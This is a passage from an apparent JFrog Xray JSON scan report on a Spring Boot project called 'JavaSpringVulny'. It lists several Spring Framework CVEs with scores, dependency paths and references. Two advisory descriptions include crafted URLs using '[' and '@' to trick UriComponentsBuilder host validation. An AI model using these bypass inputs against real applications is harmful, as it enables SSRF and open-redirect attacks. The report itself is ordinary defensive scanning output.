                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-703229",
        "references": [
          "https://github.com/spring-projects/spring-framework/commit/ee62701f5634e904e42e218baad142cea2bcd332",
          "https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N\u0026version=3.1",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-22233",
          "https://github.com/spring-projects/spring-framework/commit/edfcc6ffb188e4614ec9b212e3208b666981851c",
          "https://github.com/spring-projects/spring-framework/issues/34801",
          "https://github.com/advisories/GHSA-4wp7-92pw-q264",
          "https://spring.io/security/cve-2025-22233"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38820",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
            "cwe": [
              "CWE-178",
              "NVD-CWE-noinfo"
            ]
          }
        ],
        "summary": "The fix for CVE-2022-22968 made disallowedFields patterns in DataBinder case insensitive. However, String.toLowerCase() has some Locale dependent exceptions that could potentially result in fields not protected as expected.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-context:5.3.31": {
            "fixed_versions": [
              "[6.1.14]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.data:spring-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ]
            ]
          },
          "gav://org.springframework:spring-web:5.3.31": {
            "fixed_versions": [
              "[6.1.14]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-646819",
        "references": [
          "https://github.com/advisories/GHSA-4gc7-5j7h-4qph",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38820",
          "https://spring.io/security/cve-2024-38820",
          "https://security.netapp.com/advisory/ntap-20241129-0003/",
          "https://github.com/spring-projects/spring-framework/commits/v6.2.0-RC2",
          "https://github.com/spring-projects/spring-framework/commit/23656aebc6c7d0f9faff1080981eb4d55eff296c",
          "https://security.netapp.com/advisory/ntap-20241129-0003"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-22259",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-601"
            ]
          }
        ],
        "summary": "Applications that use UriComponentsBuilder in Spring Framework to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.\n\nThis is the same as  CVE-2024-22243 https://spring.io/security/cve-2024-22243 , but with different input.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-web:5.3.31": {
            "fixed_versions": [
              "[5.3.33]",
              "[6.0.18]",
              "[6.1.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-593888",
        "references": [
          "https://github.com/spring-projects/spring-framework/commit/381f790329a48b74c2a49fc1384dd68ca9153501",
          "https://github.com/spring-projects/spring-framework/commit/f2fd2f12269c6a781c5b2c20b3c24141055a3d68",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22259",
          "https://github.com/advisories/GHSA-hgjh-9rj2-g67j",
          "https://spring.io/security/cve-2024-22259",
          "https://github.com/spring-projects/spring-framework/commit/297cbae2990e1413537c55845a7e0ea0ffd9f9bb",
          "https://security.netapp.com/advisory/ntap-20240524-0002/",
          "https://security.netapp.com/advisory/ntap-20240524-0002"
        ],
        "extended_information": {
          "short_description": "Improper URI parsing in Spring Framework UriComponentsBuilder may lead to filter bypass when parsing crafted URLs.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nApplications that use `UriComponentsBuilder` in Spring Framework to parse an externally provided URL may be vulnerable to open redirect or SSRF attacks, if the application using the URL relies on validation checks to sanitize the URL before its use.\n\n`UriComponentsBuilder` is a utility class provided in the `org.springframework.web.util` package. It is used to construct URLs or URI components dynamically. This class is particularly useful when building URIs with dynamic parameters such as query parameters, path variables and fragments in web applications.\n\n`UriComponentsBuilder` class in `Spring` uses several regex patterns to parse and validate a given URL. A flaw in two regex patterns might lead to a filter bypass, which subsequently can lead to an open redirect attack or SSRF attack, depending on the usage of the URL.\nFor example:\n```\nUriComponents uriComponents = UriComponentsBuilder.fromUriString(\"http://google.com[127.0.0.1\")\n                .path(\"/api/resource\")\n                .queryParam(\"param1\", \"value1\")\n                .fragment(\"section1\")\n                .build();\n        System.out.println(\"userinfo: \" + uriComponents.getUserInfo());\n        System.out.println(\"host: \" + uriComponents.getHost());\n```\n\nIn the vulnerable example above, the host that will be returned by `uriComponents.getHost()` is `google.com`, although the host that will actually be used (ex. when surfing to the URL in a browser) is `127.0.0.1`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker simply has to input a URL with a `[` character"
            },
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The vulnerability's impact depends on how the URL is used after host validation. For example, if the URL is used to perform a POST request, then the impact would be SSRF, since the attacker would be able to send the POST request to an arbitrary host.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerable Spring application must validate a crafted URL using the `UriComponentsBuilder` class. In addition, the vulnerable Spring application must perform validations on the URL's host, in order for the vulnerability to have any security impact",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-22243",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-601"
            ]
          }
        ],
        "summary": "Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a  open redirect https://cwe.mitre.org/data/definitions/601.html  attack or to a SSRF attack if the URL is used after passing validation checks.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-web:5.3.31": {
            "fixed_versions": [
              "[5.3.32]",
              "[6.0.17]",
              "[6.1.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-591200",
        "references": [
          "http://seclists.org/fulldisclosure/2024/Sep/24",
          "https://security.netapp.com/advisory/ntap-20240524-0001",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22243",
          "https://github.com/advisories/GHSA-ccgv-vj62-xf9h",
          "https://security.netapp.com/advisory/ntap-20240524-0001/",
          "https://spring.io/security/cve-2024-22243",
          "https://github.com/spring-projects/spring-framework/blob/main/spring-web/src/main/java/org/springframework/web/util/UriComponentsBuilder.java"
        ],
        "extended_information": {
          "short_description": "Improper URI parsing in Spring Framework UriComponentsBuilder may lead to filter bypass when parsing crafted URLs.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nApplications that use `UriComponentsBuilder` in Spring Framework to parse an externally provided URL may be vulnerable to open redirect or SSRF attacks if the URL is used after passing validation checks.\n\n`UriComponentsBuilder` is a utility class provided in the `org.springframework.web.util` package. It is used to construct URLs or URI components dynamically. This class is particularly useful when building URIs with dynamic parameters such as query parameters, path variables and fragments in web applications.\n\n`UriComponentsBuilder` class in `Spring` uses several regex patterns to parse and validate a given URL. A flaw in two regex patterns might lead to a filter bypass, which subsequently can lead to an open redirect attack or SSRF attack, depending on the usage of the URL.\nFor example:\n```\nUriComponents uriComponents = UriComponentsBuilder.fromUriString(\"http://google.com[@127.0.0.1\")\n                .path(\"/api/resource\")\n                .queryParam(\"param1\", \"value1\")\n                .fragment(\"section1\")\n                .build();\n        System.out.println(\"userinfo: \" + uriComponents.getUserInfo());\n        System.out.println(\"host: \" + uriComponents.getHost());\n```\n\nIn the vulnerable example above, the host that will be returned by `uriComponents.getHost()` is `google.com`, although the host that will actually be used (ex. when surfing to the URL in a browser) is `127.0.0.1`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerable Spring application must validate a crafted URL using the `UriComponentsBuilder` class. In addition, the vulnerable Spring application must perform validations on the URL's host, in order for the vulnerability to have any security impact.",
              "is_positive": true
            },
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The vulnerability's impact depends on how the URL is used after host validation. For example, if the URL is used to perform a POST request, then the impact would be SSRF, since the attacker would be able to send the POST request to an arbitrary host.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker simply has to input a URL with a `@` character."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2016-1000027",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ]
          }
        ],
        "summary": "Pivotal Spring Framework through 5.3.16 suffers from a potential remote code execution (RCE) issue if used for Java deserialization of untrusted data. Depending on how the library is implemented within a product, this issue may or not occur, and authentication may be required. NOTE: the vendor's position is that untrusted data is not an intended use case. The product's behavior will not be changed because some users rely on deserialization of trusted data.",
        "severity": "Critical",
        "components": {
          "gav://org.springframework:spring-web:5.3.31": {
            "fixed_versions": [
              "[6.0.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
